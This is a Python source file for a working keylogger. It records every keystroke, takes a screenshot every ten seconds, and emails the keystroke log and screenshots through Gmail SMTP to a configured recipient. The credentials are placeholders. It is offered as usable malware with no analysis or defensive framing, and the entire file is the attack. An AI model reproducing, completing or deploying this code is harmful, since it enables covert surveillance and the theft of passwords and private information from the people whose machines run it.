import os
import smtplib
import time
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
from datetime import datetime
import pygetwindow as gw
import pyautogui
import win32clipboard

# Email Configuration
email_user = 'send-email@gmail.com'
email_password = 'password'
email_to = 'receiver-email@gmail.com'  # Updated email receiver
smtp_server = 'smtp.gmail.com'
smtp_port = 587
email_subject = 'Logged Keys and Screenshots'

# File Configuration
keystroke_file = 'keys.txt'
screenshot_folder = 'screenshot_folder_path'
clipboard_file = 'clipboard.txt'

# Create the screenshots directory if it doesn't exist
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Function to capture periodic screenshots
def capture_screenshot():
    screenshot_name = os.path.join(screenshot_folder, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    try:
        pyautogui.screenshot(screenshot_name)
        print(f"Screenshot captured: {screenshot_name}")
        return screenshot_name  # Return the screenshot path for sending later
    except Exception as e:
        print(f"Error capturing screenshot: {str(e)}")
        return None  # Return None if there was an error

# Function to send email with logged keys and screenshots
def send_email(screenshot_paths):
    try:
        with open(keystroke_file, 'r') as f:
            keystrokes = f.read()

        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_to
        msg['Subject'] = email_subject

        body = 'Please find attached the logged keys and screenshots.'
        msg.attach(MIMEText(body, 'plain'))

        # Attach the keys log
        part = MIMEApplication(keystrokes.encode(), _subtype="txt")
        part.add_header('Content-Disposition', 'attachment', filename='keys_log.txt')
        msg.attach(part)

        # Attach screenshots
        for screenshot in screenshot_paths:
            if screenshot:  # Ensure the screenshot is valid
                with open(screenshot, 'rb') as f:
                    part = MIMEApplication(f.read(), _subtype="png")
                    part.add_header('Content-Disposition', 'attachment', filename=os.path.basename(screenshot))
                    msg.attach(part)

        # Send email
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email_user, email_password)
        server.sendmail(email_user, email_to, msg.as_string())
        server.quit()
        print('Email sent successfully')
    except Exception as e:
        print(f'Error sending email: {str(e)}')

# Function to handle keystrokes and log activity
def on_press(key):
    key_name = str(key).replace("'", "")  # Clean the key representation

    # Write the key pressed to the log file in a box format
    with open(keystroke_file, 'a') as f:
        f.write(f"+---------------------+\n")
        f.write(f"| Key Pressed: {key_name:<8} |\n")  # Align the key pressed
        f.write(f"+---------------------+\n")

# Function to start keylogger and email sending loop
def start_keylogger():
    listener = Listener(on_press=on_press)
    listener.start()

    last_email_time = time.time()
    last_screenshot_time = time.time()
    screenshot_paths = []  # To hold paths of screenshots taken in the interval

    while True:
        time.sleep(1)  # Loop every second

        # Capture screenshot every 10 seconds
        if time.time() - last_screenshot_time >= 10:
            screenshot_path = capture_screenshot()  # Capture the screenshot
            if screenshot_path:  # Add to the list only if the screenshot was successful
                screenshot_paths.append(screenshot_path)
            last_screenshot_time = time.time()  # Reset the screenshot timer

        # Send email every 10 seconds
        if time.time() - last_email_time >= 10:  
            send_email(screenshot_paths)
            last_email_time = time.time()  # Reset the email timer
            screenshot_paths = []  # Clear the list of screenshot paths after sending

# Start the keylogger
start_keylogger()
